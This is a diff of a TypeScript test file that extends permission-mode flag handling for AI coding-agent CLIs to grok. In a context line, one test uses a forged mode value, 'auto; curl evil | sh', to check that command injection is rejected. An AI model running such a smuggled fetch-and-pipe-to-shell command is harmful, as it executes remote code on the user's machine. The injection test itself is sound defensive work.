@@ -10,8 +10,12 @@ import {
 } from './config'
 
 describe('hasPermissionMode', () => {
-  it('is claude-only', () => {
+  // claude and grok share the flag SPELLING and the value vocabulary, which is the whole
+  // requirement for membership. codex (--ask-for-approval) and gemini (--approval-mode) spell it
+  // differently, so they stay out until their own mapping exists.
+  it('covers claude and grok, and no one else', () => {
     expect(hasPermissionMode('claude')).toBe(true)
+    expect(hasPermissionMode('grok')).toBe(true)
     expect(hasPermissionMode('codex')).toBe(false)
     expect(hasPermissionMode('gemini')).toBe(false)
     expect(hasPermissionMode('custom:abc')).toBe(false)
@@ -71,6 +75,23 @@ describe('withPermissionMode', () => {
   it('leaves the command untouched for a forged mode', () => {
     const forged = 'auto; curl evil | sh' as unknown as AgentPermissionMode
     expect(withPermissionMode('claude', 'claude', forged)).toBe('claude')
+  })
+})
+
+describe('withPermissionMode — grok', () => {
+  it('emits the same flag it emits for claude, because grok spells it the same way', () => {
+    expect(withPermissionMode('grok', 'grok', 'plan')).toBe('grok --permission-mode plan')
+    expect(withPermissionMode('grok', 'grok', 'auto')).toBe('grok --permission-mode auto')
+    expect(withPermissionMode('grok', 'grok', 'acceptEdits')).toBe(
+      'grok --permission-mode acceptEdits'
+    )
+    expect(withPermissionMode('grok', 'grok', 'bypassPermissions')).toBe(
+      'grok --permission-mode bypassPermissions'
+    )
+  })
+
+  it("`manual` emits NO flag — which is exactly grok's own `default`", () => {
+    expect(withPermissionMode('grok', 'grok', 'manual')).toBe('grok')
   })
 })
 
